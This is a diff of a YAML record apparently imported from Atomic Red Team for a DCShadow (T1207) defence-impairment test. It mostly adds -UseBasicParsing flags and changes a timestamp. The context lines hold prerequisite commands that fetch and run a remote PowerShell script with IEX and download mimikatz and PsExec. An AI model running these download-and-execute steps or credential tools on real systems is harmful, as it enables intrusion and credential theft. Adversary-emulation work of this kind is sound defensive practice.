@@ -31,13 +31,13 @@
           if (Test-Path $mimikatz_path) {exit 0} else {exit 1}; then : ; else [Net.ServicePointManager]::SecurityProtocol
           = [Net.SecurityProtocolType]::Tls12; IEX (iwr "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"
           -UseBasicParsing); $releases = "https://api.github.com/repos/gentilkiwi/mimikatz/releases";
-          $zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
+          $zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url
           | where-object { $_.endswith(".zip") }; $mimikatz_exe = cmd /c echo PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe;
           $basePath = Split-Path $mimikatz_exe | Split-Path; Invoke-FetchFromZip $zipUrl
           "x64/mimikatz.exe" $basePath; fi; if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe")
           { exit 0} else { exit 1}; then : ; else Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip"
-          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"; Expand-Archive
-          "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
+          -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing;
+          Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
           -Force; New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe")
           -Force | Out-Null; Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\PsTools\PsExec.exe"
           "PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe" -Force; fi;
@@ -64,8 +64,8 @@
   privilege: ''
   buckets:
   - defense-impairment
-  - atomic-red-team
   - t1207
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -104,7 +104,7 @@
       get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n\
         IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"\
         \ -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\
-        \n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url\
+        \n$zipUrl = (Invoke-WebRequest $releases -UseBasicParsing | ConvertFrom-Json)[0].assets.browser_download_url\
         \ | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n\
         $basePath = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl\
         \ \"x64/mimikatz.exe\" $basePath\n"
@@ -116,7 +116,7 @@
 
         '
       get_prereq_command: 'Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip"
-        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip"
+        -OutFile "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" -UseBasicParsing
 
         Expand-Archive "PathToAtomicsFolder\..\ExternalPayloads\PsTools.zip" "PathToAtomicsFolder\..\ExternalPayloads\PsTools"
         -Force
@@ -129,4 +129,4 @@
         '
     technique_created: '2018-04-18T17:59:24.739Z'
     atomic_guid: 0f4c5eb0-98a0-4496-9c3d-656b4f2bc8f6
-    import_timestamp: '2026-10-20T07:08:29.556259Z'
+    import_timestamp: '2026-10-21T07:01:51.590379Z'
